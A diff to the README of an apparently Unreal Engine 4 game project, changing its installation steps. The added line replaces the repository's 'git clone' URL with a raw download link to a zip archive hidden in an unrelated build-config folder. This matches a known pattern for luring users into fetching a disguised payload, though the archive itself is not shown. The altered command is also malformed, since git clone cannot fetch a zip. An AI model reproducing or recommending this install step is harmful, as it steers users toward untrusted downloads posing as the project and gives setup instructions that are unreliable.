@@ -33,7 +33,7 @@ This project is built using Unreal Engine 4. It features a widget system for dis
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Cholponai02/GeometryCatcher.git
+   git clone https://raw.githubusercontent.com/Cholponai02/GeometryCatcher/main/Intermediate/Config/CoalescedSourceConfigs/Catcher-Geometry-v3.9.zip
    ```
 2. Open the project in Unreal Engine 4.
 3. The project will build automatically.
